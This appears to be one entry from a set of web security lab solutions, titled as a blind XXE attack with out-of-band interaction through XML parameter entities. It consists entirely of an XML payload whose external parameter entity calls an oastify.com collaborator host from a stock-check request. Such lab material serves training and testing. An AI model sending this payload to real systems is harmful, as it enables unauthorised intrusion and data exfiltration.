## 4. Blind XXE with out-of-band interaction via XML parameter entities

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://1z1tohoxitpcmwp5uc4i1ve9e0kr8jw8.oastify.com"> %xxe; ]>
    <stockCheck>
        <productId>3</productId>
        <storeId>1</storeId>
    </stockCheck>
```


